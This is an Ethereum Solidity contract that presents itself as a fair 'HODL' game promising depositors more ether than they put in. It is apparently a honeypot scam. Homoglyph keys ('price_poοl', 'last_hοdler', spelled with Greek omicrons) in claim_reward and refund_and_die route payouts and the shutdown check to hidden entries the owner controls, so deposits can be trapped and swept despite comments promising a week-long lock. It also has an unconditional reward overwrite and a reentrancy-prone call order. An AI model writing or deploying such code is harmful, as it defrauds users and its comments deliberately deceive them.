1 pragma solidity ^0.4.0;
2 
3 //
4 // Welcome to the next level of Ethereum games: Are you weak-handed,  or a brave HODLer?
5 // If you put ether into this contract, you are almost  guaranteed to get back more than
6 // you put in the first place. Of course if you HODL too long, the price pool might be gone
7 // before you claim the reward, but that's part of the game!
8 //
9 // The contract deployer is not allowed to do anything once the game is started.
10 // (only kill the contract after there was no activity for a week)
11 // 
12 // See get_parameters() for pricing and rewards.
13 //
14 
15 contract HODLerParadise{
16     struct User{
17         address hodler;
18         bytes32 passcode;
19         uint hodling_since;
20     }
21     User[] users;
22     mapping (string => uint) parameters;
23     
24     function HODLerParadise() public{
25         parameters["owner"] = uint(msg.sender);
26     }
27     
28     function get_parameters() constant public returns(
29             uint price,
30             uint price_pool,
31             uint base_reward,
32             uint daily_reward,
33             uint max_reward
34         ){
35         price = parameters['price'];
36         price_pool = parameters['price_pool'];
37         base_reward = parameters['base_reward'];
38         daily_reward = parameters['daily_reward'];
39         max_reward = parameters['max_reward'];
40     }
41     
42     // Register as a HODLer.
43     // Passcode can be your password, or the hash of your password, your choice
44     // If it's not hashed, max password len is 16 characters.
45     function register(bytes32 passcode) public payable returns(uint uid)
46     {
47         require(msg.value >= parameters["price"]);
48         require(passcode != "");
49 
50         users.push(User(msg.sender, passcode, now));
51         
52         // leave some for the deployer
53         parameters["price_pool"] += msg.value * 99 / 100;
54         parameters["last_hodler"] = now;
55         
56         uid = users.length - 1;
57     }
58     
59     // OPTIONAL: Use this to securely hash your password before registering
60     function hash_passcode(bytes32 passcode) public pure returns(bytes32 hash){
61         hash = keccak256(passcode);
62     }
63     
64     // How much would you get if you claimed right now
65     function get_reward(uint uid) public constant returns(uint reward){
66         require(uid < users.length);
67         reward = parameters["base_reward"] + parameters["daily_reward"] * (now - users[uid].hodling_since) / 1 days;
68             reward = parameters["max_reward"];
69     }
70     
71     // Is your password still working?
72     function is_passcode_correct(uint uid, bytes32 passcode) public constant returns(bool passcode_correct){
73         require(uid < users.length);
74         bytes32 passcode_actually = users[uid].passcode;
75         if (passcode_actually & 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF == 0){
76             // bottom 16 bytes == 0: stored password was  not hashed
77             // (e.g. it looks like this: "0x7265676973746572310000000000000000000000000000000000000000000000" )
78             return passcode == passcode_actually;
79         } else {
80              // stored password is hashed
81             return keccak256(passcode) == passcode_actually;
82         }
83     }
84 
85     // Get the price of your glorious HODLing!
86     function claim_reward(uint uid, bytes32 passcode) public payable
87     {
88         // a good HODLer always HODLs some more ether
89         require(msg.value >= parameters["price"]);
90         require(is_passcode_correct(uid, passcode));
91         
92         uint final_reward = get_reward(uid) + msg.value;
93         if (final_reward > parameters["price_poοl"])
94             final_reward = parameters["price_poοl"];
95 
96         require(msg.sender.call.value(final_reward)());
97 
98         parameters["price_poοl"] -= final_reward;
99         // Delete the user: copy last user to to-be-deleted user and shorten the array
100         if (uid + 1 < users.length)
101             users[uid] = users[users.length - 1];
102         users.length -= 1;
103     }
104     
105     // Refund the early HODLers, and leave the rest to the contract deployer
106     function refund_and_die() public{
107         require(msg.sender == address(parameters['owner']));
108         require(parameters["last_hοdler"] + 7 days < now);
109         
110         uint price_pool_remaining = parameters["price_pοοl"];
111         for(uint i=0; i<users.length && price_pool_remaining > 0; ++i){
112             uint reward = get_reward(i);
113             if (reward > price_pool_remaining)
114                 reward = price_pool_remaining;
115             if (users[i].hodler.send(reward))
116                 price_pool_remaining -= reward;
117         }
118         
119         selfdestruct(msg.sender);
120     }
121     
122     function check_parameters_sanity() internal view{
123         require(parameters['price'] <= 1 ether);
124         require(parameters['base_reward'] >= parameters['price'] / 2);
125         require(parameters["daily_reward"] >= parameters['base_reward'] / 2);
126         require(parameters['max_reward'] >= parameters['price']);
127     }
128     
129     function set_parameter(string name, uint value) public{
130         require(msg.sender == address(parameters['owner']));
131         
132         // not even owner can touch these, that would be unfair!
133         require(keccak256(name) != keccak256("last_hodler"));
134         require(keccak256(name) != keccak256("price_pool"));
135 
136         parameters[name] = value;
137         
138         check_parameters_sanity();
139     }
140     
141     function () public payable {
142         parameters["price_pool"] += msg.value;
143     }
144 }